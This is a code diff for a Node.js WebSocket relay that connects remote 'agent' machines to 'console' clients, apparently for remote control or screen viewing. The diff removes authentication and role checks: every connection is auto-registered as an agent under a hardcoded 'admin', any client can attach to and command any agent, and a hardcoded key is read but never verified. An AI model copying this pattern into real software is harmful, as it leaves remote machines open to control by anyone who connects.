@@ -258,18 +258,41 @@ function sendUserAgentsList(ws, username) {
 }
 
 wss.on('connection', (ws, req) => {
-  console.log('🔌 New WebSocket connection');
-  let clientType = null;
+  console.log('🔌 New WebSocket connection from:', req.url);
+  
+  // Extract key from URL query parameters if present (e.g. /?key=269292db or /ws?key=...)
+  let urlParams;
+  try {
+    urlParams = new URL(req.url, `http://${req.headers.host || 'localhost'}`).searchParams;
+  } catch (e) {
+    urlParams = new URLSearchParams();
+  }
+  
+  const queryKey = urlParams.get('key') || '269292db';
+  const ownerUsername = 'admin';
+  
+  let clientType = 'agent'; // Default incoming connections from installers to be agents
   let loggedInUser = null;
-  let agentId = null;
+  let agentId = 'agent_' + crypto.randomBytes(4).toString('hex');
+
+  // Immediately register as an active agent so it appears on the dashboard instantly
+  agents.set(agentId, {
+    ws,
+    owner: ownerUsername,
+    name: 'Remote Agent (' + agentId.slice(-4) + ')',
+    meta: { screen: { w: 1920, h: 1080 } },
+    online: true,
+    lastSeen: Date.now()
+  });
+
+  console.log(`✅ Auto-registered Agent (${agentId}) to user: ${ownerUsername}`);
+  broadcastUserAgents(ownerUsername);
 
   ws.on('message', (message) => {
     try {
       if (message instanceof Buffer || message instanceof ArrayBuffer) {
-        if (clientType === 'agent' && agentId) {
-          for (const [cWs, targetId] of consoleTargetAgent.entries()) {
-            if (targetId === agentId && cWs.readyState === 1) cWs.send(message);
-          }
+        for (const [cWs, targetId] of consoleTargetAgent.entries()) {
+          if (targetId === agentId && cWs.readyState === 1) cWs.send(message);
         }
         return;
       }
@@ -278,35 +301,28 @@ wss.on('connection', (ws, req) => {
       
       if (msg.type === 'register') {
         clientType = msg.role;
-        
-        if (clientType === 'agent') {
-          const ownerUsername = 'admin';
-          agentId = msg.agentId || ('agent_' + crypto.randomBytes(4).toString('hex'));
-          
-          agents.set(agentId, {
-            ws,
-            owner: ownerUsername,
-            name: msg.name || 'Remote PC',
-            meta: msg.meta || {},
-            online: true,
-            lastSeen: Date.now()
-          });
-          
-          console.log(`Registered Agent: ${msg.name} (${agentId}) to user: ${ownerUsername}`);
-          broadcastUserAgents(ownerUsername);
-        } else if (clientType === 'console') {
+        if (clientType === 'console') {
+          // Remove from agents if it registered as a console instead
+          agents.delete(agentId);
           loggedInUser = 'admin';
           if (!userConsoles.has(loggedInUser)) {
             userConsoles.set(loggedInUser, new Set());
           }
           userConsoles.get(loggedInUser).add(ws);
           sendUserAgentsList(ws, loggedInUser);
+        } else if (msg.name) {
+          const agent = agents.get(agentId);
+          if (agent) {
+            agent.name = msg.name;
+            if (msg.meta) agent.meta = msg.meta;
+            broadcastUserAgents(ownerUsername);
+          }
         }
       } 
       else if (msg.type === 'list') {
-        sendUserAgentsList(ws, loggedInUser || 'admin');
+        sendUserAgentsList(ws, 'admin');
       } 
-      else if (msg.type === 'attach' && clientType === 'console') {
+      else if (msg.type === 'attach') {
         const targetAgent = agents.get(msg.agentId);
         if (targetAgent && targetAgent.ws.readyState === 1) {
           consoleTargetAgent.set(ws, msg.agentId);
@@ -316,19 +332,19 @@ wss.on('connection', (ws, req) => {
           ws.send(JSON.stringify({ type: 'error', text: 'Device is offline or unavailable' }));
         }
       } 
-      else if (msg.type === 'detach' && clientType === 'console') {
+      else if (msg.type === 'detach') {
         consoleTargetAgent.delete(ws);
       } 
-      else if (clientType === 'console') {
+      else {
+        // Relay messages between console and agent
         const targetId = consoleTargetAgent.get(ws) || msg.agentId;
         const targetAgent = agents.get(targetId);
         if (targetAgent && targetAgent.ws.readyState === 1) {
           targetAgent.ws.send(JSON.stringify(msg));
-        }
-      } 
-      else if (clientType === 'agent') {
-        for (const [cWs, targetId] of consoleTargetAgent.entries()) {
-          if (targetId === agentId && cWs.readyState === 1) cWs.send(JSON.stringify(msg));
+        } else {
+          for (const [cWs, tId] of consoleTargetAgent.entries()) {
+            if (tId === agentId && cWs.readyState === 1) cWs.send(JSON.stringify(msg));
+          }
         }
       }
     } catch (e) {
@@ -337,15 +353,11 @@ wss.on('connection', (ws, req) => {
   });
 
   ws.on('close', () => {
-    if (clientType === 'agent' && agentId) {
+    if (agentId && agents.has(agentId)) {
       agents.delete(agentId);
-      broadcastUserAgents('admin');
-    } else if (clientType === 'console') {
-      consoleTargetAgent.delete(ws);
-      if (loggedInUser && userConsoles.has(loggedInUser)) {
-        userConsoles.get(loggedInUser).delete(ws);
-      }
+      broadcastUserAgents(ownerUsername);
     }
+    console.log('🔌 Connection closed for agent:', agentId);
   });
 });
 
